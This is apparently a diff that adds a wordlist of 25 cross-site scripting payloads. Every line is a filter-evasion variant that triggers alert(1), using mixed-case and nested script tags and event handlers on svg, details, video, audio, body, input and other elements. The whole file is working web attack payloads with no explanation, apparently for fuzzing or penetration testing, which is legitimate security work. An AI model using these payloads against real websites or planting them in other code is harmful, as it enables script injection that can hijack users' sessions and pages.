@@ -1,0 +1,25 @@
+<ScRiPt>alert(1)</ScRiPt>
+<scr<script>ipt>alert(1)</scr<script>ipt>
+<script>alert(1)<!--
+<script>alert(1)//
+"><script>alert(1)//"
+'><script>alert(1)//'
+<svg/onload=alert(1)>
+<svg onload=alert(1)>
+<svg/onload=alert(1)//"
+<svg onload=alert(1)//"
+<svg/onload=alert(1)//'
+<svg/onload=alert(1)//
+<details open ontoggle=alert(1)>
+<details/open/ontoggle=alert(1)>
+<details//open/ontoggle=alert(1)>
+<video><source onerror=alert(1)>
+<video src=x onerror=alert(1)>
+<audio src=x onerror=alert(1)>
+<marquee onstart=alert(1)>
+<body onload=alert(1)>
+<input autofocus onfocus=alert(1)>
+<select onfocus=alert(1) autofocus>
+<textarea onfocus=alert(1) autofocus>
+<keygen onfocus=alert(1) autofocus>
+<video/poster/onerror=alert(1)>
